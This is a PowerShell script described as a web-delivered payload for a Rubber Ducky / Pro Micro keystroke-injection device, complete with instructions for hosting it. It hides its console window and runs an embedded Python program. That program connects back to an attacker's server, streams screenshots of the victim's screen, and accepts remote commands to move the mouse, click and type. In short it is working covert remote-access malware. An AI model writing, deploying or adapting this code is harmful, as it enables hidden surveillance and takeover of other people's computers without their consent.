# ================================================================
# POWERSHELL PAYLOAD FOR WEB DELIVERY (Rubber Ducky downloads this)
# ================================================================
# Host this file on your server: python -m http.server 8000
# ================================================================

# Hide console window
try {
    Add-Type -Name Window -Namespace Console -MemberDefinition '
    [DllImport("Kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
    '
    $consolePtr = [Console.Window]::GetConsoleWindow()
    [Console.Window]::ShowWindow($consolePtr, 0) | Out-Null
} catch {}

# Get server IP and port from environment or use defaults
$serverIP = if ($env:RCPY_SERVER) { $env:RCPY_SERVER } else { "172.28.1.78" }
$serverPort = if ($env:RCPY_PORT) { $env:RCPY_PORT } else { 5555 }

# If passed as variables from Pro Micro
if ($c) { $serverIP = $c }
if ($p) { $serverPort = $p }

# Python payload - screen capture version
$pythonCode = @"
import socket,pickle,pyautogui,cv2,numpy as np,time,sys,threading
try:
    import ctypes
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(),0)
except:pass
pyautogui.PAUSE=0
pyautogui.FAILSAFE=False
s=socket.socket()
s.settimeout(10)
try:
    s.connect(('$serverIP',$serverPort))
except:
    sys.exit()
s.settimeout(0.1)
running=[True]
sw,sh=pyautogui.size()
def cmd():
    while running[0]:
        try:
            d=s.recv(20)
            if d and d.startswith(b'CMD:'):
                sz=int(d.decode().split(':')[1].strip())
                data=b''
                while len(data)<sz:
                    p=s.recv(min(4096,sz-len(data)))
                    if not p:break
                    data+=p
                if len(data)==sz:
                    c=pickle.loads(data)
                    t=c.get('type')
                    d=c.get('data')
                    if t=='MOUSE_MOVE':
                        pyautogui.moveTo(int(d['norm_x']*sw),int(d['norm_y']*sh),duration=0,_pause=False)
                    elif t=='MOUSE_DOWN':
                        pyautogui.moveTo(int(d['norm_x']*sw),int(d['norm_y']*sh),duration=0,_pause=False)
                        pyautogui.mouseDown(button=d['button'],_pause=False)
                    elif t=='MOUSE_UP':
                        pyautogui.moveTo(int(d['norm_x']*sw),int(d['norm_y']*sh),duration=0,_pause=False)
                        pyautogui.mouseUp(button=d['button'],_pause=False)
                    elif t=='MOUSE_CLICK':
                        pyautogui.click(int(d['norm_x']*sw),int(d['norm_y']*sh),button=d['button'],_pause=False)
                    elif t=='KEY_CHAR':
                        try:
                            pyautogui.write(d,interval=0)
                        except:pass
        except:pass
threading.Thread(target=cmd,daemon=True).start()
while running[0]:
    try:
        ss=pyautogui.screenshot()
        f=np.array(ss)
        f=cv2.cvtColor(f,cv2.COLOR_RGB2BGR)
        _,buf=cv2.imencode('.jpg',f,[int(cv2.IMWRITE_JPEG_QUALITY),80])
        data=pickle.dumps(buf)
        sz=len(data)
        s.sendall(f"{sz:<16}".encode())
        s.sendall(data)
        time.sleep(0.1)
    except:
        break
s.close()
"@

# Execute Python payload
$pythonCode | python -
